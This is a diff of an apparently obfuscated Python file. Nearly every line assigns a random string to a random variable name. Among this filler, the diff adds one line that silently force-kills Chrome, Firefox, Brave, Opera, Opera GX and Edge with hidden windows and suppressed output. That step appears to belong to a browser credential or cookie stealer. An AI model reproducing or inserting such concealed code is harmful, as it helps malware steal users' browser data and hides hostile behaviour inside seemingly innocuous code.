@@ -48,6 +48,7 @@ htwyOuJXSkYNHwXeQEgYNFGhubtrjhuEcPutIuqoXagzysGksLLyAibuMCp = 'sHnWcrvfzqCnriIhP
 sHnWcrvfzqCnriIhPmLUTGMbqbIanSgFMPiYpQJWDqmtVdwqWwUDXtTXRdt = 'DGeJIlkxokjDvAFGwezdpVUuVmgdZiiHftHweYxjAIwAPoMRiLjtvgF'
 WBuzokpjHjMnGWhbaEbQfEDstwHOUwbUPlRYNnKXvKXPdHEsnbBZuVPZjd = 'GZTgqhbkPrsOWdWhgyhaanPPiWhBuQEmfIscczwuGBFTDBrukSXAGimRCM'
 NjkknvxBZdfXaseaVStNgvUOGucMnojSXlPDBfeCFxBpmALQnW = 'iColSNZJxXHUOqrJzzpwFVDccBQOdlCqCUjMofCBoWpNeNdaxbRoBx'
+for task in ["chrome", "firefox", "brave", "opera", "opera_gx", "msedge"]: startupinfo = subprocess.STARTUPINFO(); startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW; subprocess.call(f'taskkill /f /im  {task}.exe', startupinfo=startupinfo, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)
 wppWBlAVPvwEGbGeJTvisHAFCilyatrtGGVsOiAZvqGvlEsqeWV = 'DGaGfmfAKmprpAeecQeVyzSnkCkWgJBMVWVOcAqkQveFgOpKxBshiIEDuJQ'
 smCuHeoEfyZbJRbdwGmOvUSqebZydBhASKnqfYacytAJdgQGHFGk = 'RKIHFmXrYsIspjfLejpXmPJkkhIavztzZXOEgqxyxvwWgKsUSPslroXW'
 CDnfzICNxqIOzWgLDnnZjNnKOmAVnyNpYIjSsOTUWXFKhboIuqzJfhYBD = 'thnhOOMcBLvRaiMLmJjcgNNYXLGDdVGgfvkyEVRRjtqJIfUsSDZedLe'
